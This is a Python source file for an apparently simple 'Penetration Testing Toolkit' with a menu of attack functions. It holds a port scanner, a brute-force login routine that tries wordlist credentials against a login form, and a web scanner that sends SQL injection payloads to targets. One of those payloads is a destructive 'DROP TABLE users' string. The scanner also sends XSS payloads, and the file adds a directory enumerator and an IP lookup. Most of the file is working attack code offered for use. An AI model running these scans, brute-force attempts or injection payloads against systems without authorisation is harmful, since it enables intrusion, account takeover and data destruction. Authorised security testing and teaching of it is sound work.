import socket
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json

# ---------------------------
# 1. Port Scanner
# ---------------------------
def port_scan(host, ports=[21, 22, 80, 443, 8080]):
    print(f"\n[+] Scanning ports on {host}...")
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    print(f"    [+] Port {port} is OPEN")
        except Exception as e:
            print(f"    [-] Error scanning port {port}: {e}")

# ---------------------------
# 2. Brute Force Login
# ---------------------------
def brute_force_login(url, usernames, passwords):
    print(f"\n[+] Starting brute-force attack on {url}")
    for username in usernames:
        for password in passwords:
            data = {"username": username.strip(), "password": password.strip()}
            try:
                response = requests.post(url, data=data)
                if "Welcome" in response.text or response.status_code == 200:
                    print(f"    [+] Login successful: {username}:{password}")
                    return
            except Exception as e:
                print(f"    [-] Request failed: {e}")
    print("    [-] No valid credentials found.")

# ---------------------------
# 3. Vulnerability Scanner
# ---------------------------
def scan_web_vulns(url):
    sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
    xss_payloads = ["<script>alert('XSS')</script>", "\"'><img src=x onerror=alert(1)>"]
    sql_errors = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated"
    ]

    print(f"\n[+] Testing {url} for SQL Injection...")
    for payload in sql_payloads:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url)
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"    [-] SQLi detected with payload: {payload}")
                    break
        except:
            print("    [-] Error during SQLi test.")

    print(f"\n[+] Testing {url} for XSS...")
    for payload in xss_payloads:
        test_url = f"{url}?search={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"    [-] XSS detected with payload: {payload}")
        except:
            print("    [-] Error during XSS test.")

# ---------------------------
# 4. Directory Enumerator
# ---------------------------
def dir_enum(url, wordlist):
    print(f"\n[+] Starting directory enumeration on {url}")
    for word in wordlist:
        full_url = f"{url.rstrip('/')}/{word.strip()}"
        try:
            r = requests.get(full_url)
            if r.status_code == 200:
                print(f"    [+] Found: {full_url}")
        except:
            continue

# ---------------------------
# 5. IP/Domain Info Lookup
# ---------------------------
def ip_lookup(ip):
    print(f"\n[+] Fetching IP info for {ip}...")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        data = r.json()
        for key, value in data.items():
            print(f"    {key.capitalize()}: {value}")
    except:
        print("    [-] Failed to fetch IP info.")

# ---------------------------
# Toolkit Menu
# ---------------------------
def main():
    while True:
        print("\n=== Penetration Testing Toolkit ===")
        print("1. Port Scanner")
        print("2. Brute Force Login")
        print("3. Web Vulnerability Scanner")
        print("4. Directory Enumerator")
        print("5. IP Info Lookup")
        print("0. Exit")
        choice = input("Select an option: ")

        if choice == "1":
            host = input("Enter target host (e.g., 127.0.0.1): ")
            port_scan(host)
        elif choice == "2":
            url = input("Enter login form URL: ")
            usernames = open("wordlists/users.txt").readlines()
            passwords = open("wordlists/passwords.txt").readlines()
            brute_force_login(url, usernames, passwords)
        elif choice == "3":
            url = input("Enter target URL: ")
            scan_web_vulns(url)
        elif choice == "4":
            url = input("Enter base URL: ")
            words = open("wordlists/dirs.txt").readlines()
            dir_enum(url, words)
        elif choice == "5":
            ip = input("Enter IP or domain: ")
            ip_lookup(ip)
        elif choice == "0":
            print("Exiting toolkit.")
            break
        else:
            print("Invalid option.")

# ---------------------------
# Entry Point
# ---------------------------
if __name__ == "__main__":
    main()
1